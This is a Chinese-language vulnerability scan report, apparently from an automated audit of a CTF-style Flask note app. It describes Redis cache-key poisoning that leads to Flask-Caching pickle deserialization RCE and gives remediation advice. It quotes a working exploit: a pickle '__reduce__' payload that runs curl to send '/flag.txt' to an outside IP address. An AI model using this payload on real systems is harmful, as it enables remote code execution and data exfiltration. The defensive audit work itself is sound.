# 漏洞扫描报告

## 整体结论

本项目审计发现高危漏洞：通过 Redis 缓存投毒机制，攻击者可以实现远程代码执行（RCE）。
主要威胁：
1. **远程代码执行 (RCE)**：攻击者利用 Flask-Caching 库在读取以 `!` 开头的缓存值时会执行 Pickle 反序列化的特性，结合 Redis 键覆盖漏洞，可实现系统级命令执行。
2. **缓存投毒 (Cache Poisoning)**：由于笔记接口未对 `title` 参数进行过滤，攻击者可以恶意覆盖 Flask-Caching 的内部缓存键。

建议：
- 在 `app.py` 中对用户输入的 `title` 进行严格的字符过滤，禁止包含 `flask_cache_view//` 等敏感前缀。
- 对存储到 Redis 的 `content` 进行校验，或者更换更安全的序列化方案（如 JSON），避免直接使用 `pickle` 反序列化。

## 审计防护（Prompt 隔离层）

- 扫描文件 11 个，其中 0 个含需消毒内容
- 剥离不可见/Bidi 字符 0 个；中和注入触发词 0 处

## [HIGH] Redis 缓存投毒导致 Flask-Caching 反序列化 RCE
- 文件: app.py
- 代码: `redis.setex(name=title, value=content, time=3)`
- 证据: app.py:43: redis.setex(name=title, value=content, time=3)  # Note will only live for max 30 seconds
solve.py:6-10: import pickle
class pwn(object):
    def __reduce__(self):
        return os.system, ('curl http://216.165.2.48:9999/ --data \"$(cat /flag.txt)\"',)
p = b'!' + pickle.dumps(pwn())
post('12380:5000/', files={"content": io.BytesIO(p)}, data={"title": "flask_cache_view//test1"})
- 攻击路径: 攻击者可以通过 POST 请求提交特定的 `title`（如 `flask_cache_view//test1`）来覆盖 Flask-Caching 在 Redis 中的缓存键，并同时上传以 `!` 开头的恶意 Pickle Payload 作为 `content`。当应用程序访问该缓存路径时，Flask-Caching 会对该值进行反序列化，从而触发恶意代码（如 `os.system`）执行，导致远程代码执行（RCE）。

## [HIGH] 笔记接口允许任意 Redis 键覆盖，绕过预期过滤
- 文件: app.py
- 代码: `title = request.form.get('title', default=None)`
- 证据: app.py:32: title = request.form.get('title', default=None)
app.py:43: redis.setex(name=title, value=content, time=3)  # Note will only live for max 30 seconds
- 攻击路径: `app.py` 实现中未按预期对 `title` 进行过滤（README 提及的 `flask_cache_view//` 替换逻辑缺失），导致攻击者可以直接利用完整的缓存键名进行写入，从而实现对 Redis 缓存键的任意覆盖。

## 攻击链推演（Deepen）

### 攻击链 1
- 前置条件:
  - 攻击者能够控制 Redis 中的键值对
  - Flask-Caching 库未对缓存值进行充分的验证和过滤
- 横向移动/影响面:
  - 攻击者构造恶意 pickle 对象并通过 Redis 存储到目标缓存键中
  - 攻击者触发 Flask-Caching 对缓存值的反序列化，执行恶意代码
- 最终影响: 攻击者能够执行任意系统命令，从而完全控制服务器
- 修复建议: 在 app.py 中对 Redis 键值进行严格的输入验证和过滤，确保所有缓存值在存储和反序列化前经过安全检查

### 攻击链 2
- 前置条件:
  - 攻击者能够通过 POST 请求提交标题和内容到 Redis 中
- 横向移动/影响面:
  - 攻击者可以构造特定标题以覆盖 Flask-Caching 缓存的 Redis 键
  - 上传恶意 pickle 对象以控制服务器行为
- 最终影响: 攻击者能够执行任意系统命令，例如读取敏感文件 /flag.txt 并发送到远程服务器
- 修复建议: 修改 app.py 中的标题处理逻辑，添加严格的过滤规则，防止标题中包含 'flask_cache_view//' 等危险字符
